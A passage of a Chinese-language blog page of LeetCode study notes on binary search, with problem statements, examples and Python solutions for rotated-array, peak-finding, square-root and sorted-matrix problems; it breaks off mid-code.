Array</h1><p>反转数组找值, 一个sort之后的列表(无重复值)我们切一刀然后后半部分丢到前面: 比如[1,2,3,4,5]我们在2,3中间切, 就会有[3,4,5,1,2].</p><p>给出一个target, 要求找出index, 不存在的时候返回-1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [4,5,6,7,0,1,2], target = 0</span><br><span class="line">    Output: 4</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [4,5,6,7,0,1,2], target = 3</span><br><span class="line">    Output: -1</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: nums = [1], target = 0</span><br><span class="line">    Output: -1</span><br></pre></td></tr></table></figure><p>画图即可</p><p><img src="searchRotated.png" /></p><p><code>nums[mid] &lt; nums[l]</code> 对应case1, 然后 <code>nums[mid] &lt; target &lt;= nums[r]</code> 对应后半段, 即l = mid + 1, 否则对应前半段, r = mid - 1</p><p>同样逻辑对应case2即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r-l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">elif</span> nums[mid] &lt; nums[l]:</span><br><span class="line">                <span class="keyword">if</span> nums[mid] &lt; target &lt;= nums[r]:</span><br><span class="line">                    l = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> nums[l] &lt;= target &lt; nums[mid]:</span><br><span class="line">                    r = mid - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="search-in-rotated-sorted-array-ii">81. Search in Rotated Sorted Array II</h1><p>同前一题, 区别是元素可以重复.</p><p>最直观的做法就是一旦 <code>nums[mid] == nums[l]</code> 我们就 <code>l += 1</code>, 只要保证这俩不同, duplicates就相当于失去了作用, 之前的逻辑就可以直接套用.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r-l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> nums[l] == nums[mid]:</span><br><span class="line">                l += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> nums[mid] &lt; nums[l]:</span><br><span class="line">                <span class="keyword">if</span> nums[mid] &lt; target &lt;= nums[r]:</span><br><span class="line">                    l = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = mid - <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> nums[l] &lt;= target &lt; nums[mid]:</span><br><span class="line">                    r = mid - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h1 id="find-minimum-in-rotated-sorted-array">153. Find Minimum in Rotated Sorted Array</h1><p>反转列表找出最小值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [3,4,5,1,2]</span><br><span class="line">    Output: 1</span><br><span class="line">    Explanation: The original array was [1,2,3,4,5] rotated 3 times.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [4,5,6,7,0,1,2]</span><br><span class="line">    Output: 0</span><br><span class="line">    Explanation: The original array was [0,1,2,4,5,6,7] and it was rotated 4 times.</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: nums = [11,13,15,17]</span><br><span class="line">    Output: 11</span><br><span class="line">    Explanation: The original array was [11,13,15,17] and it was rotated 4 times. </span><br></pre></td></tr></table></figure><p>面试碰到了, 细分情况没分出来, 其实正确做法是以最后一个元素为坐标来找. 半开半闭返回l即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findMin</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = n - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt; r:</span><br><span class="line">            mid = l + (r-l) // <span class="number">2</span></span><br><span class="line">            <span class="comment"># min在右侧</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] &gt; nums[-<span class="number">1</span>]:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># min在左侧或者直接是mid</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = mid</span><br><span class="line">        <span class="keyword">return</span> nums[l]</span><br></pre></td></tr></table></figure><h1 id="find-minimum-in-rotated-sorted-array-ii">154. Find Minimum in Rotated Sorted Array II</h1><p>同上题, 但是包含重复, 重复项的解决和之前那题一样, 扫到了直接 <code>r -= 1</code> 即可. 下面的代码可以继续合并elif, 不过这样更直观一些.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findMin</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt; r:</span><br><span class="line">            mid = l + (r-l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] == nums[r]:</span><br><span class="line">                r -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span>      </span><br><span class="line">            <span class="keyword">if</span> nums[mid] &gt; nums[r]:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = mid</span><br><span class="line">        <span class="keyword">return</span> nums[l]</span><br></pre></td></tr></table></figure><h1 id="find-first-and-last-position-of-element-in-sorted-array">34. Find First and Last Position of Element in Sorted Array</h1><p>找排序列表中一个数的<strong>起始和末尾</strong>索引, 不存在的时候返回 <code>[-1, -1]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [5,7,7,8,8,10], target = 8</span><br><span class="line">    Output: [3,4]</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [5,7,7,8,8,10], target = 6</span><br><span class="line">    Output: [-1,-1]</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: nums = [], target = 0</span><br><span class="line">    Output: [-1,-1]</span><br></pre></td></tr></table></figure><p>比较经典的二分, 注意找到值的时候仅 <code>nums[mid] &lt; target</code> 才做 <code>l = mid + 1</code>, 否则 <code>r = mid - 1</code>, 这样才能找到左值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">binsearch</span>(<span class="params">self, nums, target</span>):</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r-l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] &lt; target:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">searchRange</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        start = self.binsearch(nums, target)</span><br><span class="line">        <span class="keyword">if</span> start == <span class="built_in">len</span>(nums) <span class="keyword">or</span> nums[start] != target:</span><br><span class="line">            <span class="keyword">return</span> [-<span class="number">1</span>, -<span class="number">1</span>]</span><br><span class="line">        end = self.binsearch(nums, target+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> [start, end - <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h1 id="sqrtx">69. Sqrt(x)</h1><p>字面意思, 求开方</p><p>二分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mySqrt</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = x</span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r-l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid*mid &gt; x:</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure><p>牛顿法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mySqrt</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        b = x</span><br><span class="line">        <span class="keyword">while</span> b*b &gt; x:</span><br><span class="line">            <span class="comment"># y = y0 + y&#x27;(x-x0)</span></span><br><span class="line">            <span class="comment"># -&gt; x0 - x = y0 / y&#x27;</span></span><br><span class="line">            <span class="comment"># -&gt; x = x0 - y0 / y&#x27;</span></span><br><span class="line">            <span class="comment"># 而y = x^2 - target</span></span><br><span class="line">            <span class="comment"># -&gt; x = x0 - (x0^2 - target) / 2x0</span></span><br><span class="line">            <span class="comment"># -&gt; x = 0.5x0 + target / 2x0</span></span><br><span class="line">            <span class="comment"># -&gt; x = (x0 + target/x0) / 2</span></span><br><span class="line">            b = (b + x//b) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><h1 id="find-peak-element">162. Find Peak Element</h1><p>A peak element is an element that is <strong>strictly greater</strong> than its neighbors.</p><p>Given a 0-indexed integer array <code>nums</code>, find a peak element, and return its index. If the array contains multiple peaks, return the index to <strong>any of the peaks</strong>.</p><p>You may imagine that <code>nums[-1] = nums[n] = -∞</code>. In other words, an element is always considered to be strictly greater than a neighbor that is outside the array.</p><p>You must write an algorithm that runs in <code>O(log n)</code> time.</p><p>然后限制条件 <code>nums[i] != nums[i + 1] for all valid i.</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [1,2,3,1]</span><br><span class="line">    Output: 2</span><br><span class="line">    Explanation: 3 is a peak element and your function should return the index number 2.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [1,2,1,3,5,6,4]</span><br><span class="line">    Output: 5</span><br><span class="line">    Explanation: Your function can return either index number 1 where the peak element is 2, or index number 5 where the peak element is 6.</span><br></pre></td></tr></table></figure><p>老实说我觉得这题用二分真的挺难理解的. 这里的二分主要是维持中间的区间, 发现递增丢左边界, 递减丢右边界, valley优先丢左, peak直接返回. 但是不管怎么说还是挺抽象的.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findPeakElement</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r-l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid &lt; n - <span class="number">1</span> <span class="keyword">and</span> nums[mid] &lt; nums[mid+<span class="number">1</span>]:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> mid &gt; <span class="number">0</span> <span class="keyword">and</span> nums[mid] &lt; nums[mid-<span class="number">1</span>]:</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> mid</span><br></pre></td></tr></table></figure><h1 id="search-a-2d-matrix">74. Search a 2D Matrix</h1><p>You are given an m x n integer matrix matrix with the following two properties:</p><ul><li>Each row is sorted in non-decreasing order.<br /></li><li>The first integer of each row is greater than the last integer of the previous row.</li></ul><p>检查某个target是否在矩阵中</p><p>标准二分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">binsearch</span>(<span class="params">self, nums, target</span>):</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r - l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">searchMatrix</span>(<span class="params">self, matrix: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]], target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        first_col = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> matrix]</span><br><span class="line">        target_row = self.binsearch(first_col, target)</span><br><span class="line">        target_col = self.binsearch(matrix[target_row], target)</span><br><span class="line">        <span class="keyword">return</span> matrix[target_row][target_col] == target</span><br></pre></td></tr></table></figure><h1 id="search-a-2d-matrix-ii">240. Search a 2D Matrix II</h1><p>Write an efficient algorithm that searches for a value <code>target</code> in an <code>m x n</code> integer matrix <code>matrix</code>. This matrix has the following properties:</p><ul><li>Integers in each row are sorted in ascending from left to right.<br /></li><li>Integers in each column are sorted in ascending from top to bottom.</li></ul><p>行递增且列递增, 但是不保证其他</p><p><img src="search2dmatrix.png" /></p><p>即存在左下大于右上的情况.</p><h2 id="取路径omn">取路径O(m+n)</h2><p><a href="https://leetcode.com/problems/search-a-2d-matrix-ii/solutions/2324351/python-explained">PYTHON || EXPLAINED ||</a></p><p><img src="binsearch_path.png" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">searchMatrix</span>(<span class="params">self, matrix: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]], target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        m = <span class="built_in">len</span>(matrix)</span><br><span class="line">        n = <span class="built_in">len</span>(matrix[<span class="number">0</span>])</span><br><span class="line">        i = m - <span class="number">1</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &gt;= <span class="number">0</span> <span class="keyword">and</span> j &lt; n:</span><br><span class="line">            <span class="keyword">if</span> matrix[i][j] == target:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> matrix[i][j] &gt; target:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h2 id="二分omlogn">二分O(mlogn)</h2><p>剪支二分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">binsearch</span>(<span class="params">self, nums, target</span>):</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r-l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">elif</span> nums[mid] &gt; target:</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">searchMatrix</span>(<span class="params">self, matrix: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]], target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        m = <span class="built_in">len</span>(matrix)</span><br><span class="line">        n = <span class="built_in">len</span>(matrix[<span class="number">0</span>])</span><br><span class="line">        col = n</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            col = self.binsearch(matrix[row][:col], target)</span><br><span class="line">            <span class="keyword">if</span> col &lt; n <span class="keyword">and</span> matrix[row][col] == target:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h1 id="find-a-peak-element-ii">1901. Find a Peak Element II</h1><p>二维数组找出峰值, 依然非常抽象, 我个人感觉这起码应该是个hard. 列找峰值和前面一样, 区别在于对于每一个mid, 我们去找那一行的最大值索引, 然后去做判断.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxRow</span>(<span class="params">self, mat, col</span>):</span><br><span class="line">        idx = -<span class="number">1</span></span><br><span class="line">        v = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line">            <span class="keyword">if</span> mat[row][col] &gt; v:</span><br><span class="line">                v = mat[row][col]</span><br><span class="line">                idx = row</span><br><span class="line">        <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findPeakGrid</span>(<span class="params">self, mat: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        n = <span class="built_in">len</span>(mat[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = n - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r-l) // <span class="number">2</span></span><br><span class="line">            row = self.maxRow(mat, mid)</span><br><span class="line">            left = mat[row][mid-<span class="number">1</span>] <span class="keyword">if</span> mid &gt; <span class="number">0</span> <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">            right = mat[row][mid+<span class="number">1</span>] <span class="keyword">if</span> mid &lt; n - <span class="number">1</span> <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> mat[row][mid] &lt; left:</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">elif</span> mat[row][mid] &lt; right:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> [row, mid]</span><br></pre></td></tr></table></figure><h1 id="single-element-in-a-sorted-array">540. Single Element in a Sorted Array</h1><p>You are given a sorted array consisting of only integers where every element appears exactly twice, except for one element which appears exactly once.</p><p>Return the single element that appears only once.</p><p>Your solution must run in O(log n) time and O(1) space.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [1,1,2,3,3,4,4,8,8]</span><br><span class="line">    Output: 2</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [3,3,7,7,10,11,11]</span><br><span class="line">    Output: 10</span><br></pre></td></tr></table></figure><p>经典二分, 区别在于需要注意奇偶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">singleNonDuplicate</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = n - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt; r:</span><br><span class="line">            mid = l + (r-l) // <span 